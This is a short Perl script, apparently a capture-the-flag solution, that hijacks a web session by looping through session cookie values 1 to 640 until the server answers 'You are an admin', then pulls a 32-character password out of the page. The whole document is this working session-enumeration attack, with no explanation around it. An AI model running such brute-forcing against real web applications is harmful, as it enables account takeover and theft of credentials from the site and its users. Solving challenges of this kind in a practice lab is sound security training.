sub req {
    my ($candidate) = @_;
    my %headers = (
        'Authorization' => 'Basic ' . encode_base64("$user:$pass", ''),
        'Content-Type' => 'application/x-www-form-urlencoded',
        'Cookie' => "PHPSESSID=$candidate",
    );

    my $response = $http->post($url, {
        headers => \%headers,
        content => "username=test&password=test"
    });

    unless ($response->{success}) {
        die "Failed: $response->{status} $response->{content}\n";
    }

    return $response->{content};
}

for my $n (1..640) {
    print "Testing cookie: $n\n";
    my $res = req $n;

    if ($res =~ 'You are an admin') {
        print "Found it: $n\n";
        my ($pass) = (req $n) =~ /Password:\s*(\S{32})/;
        print $pass;
        last;
    }
}
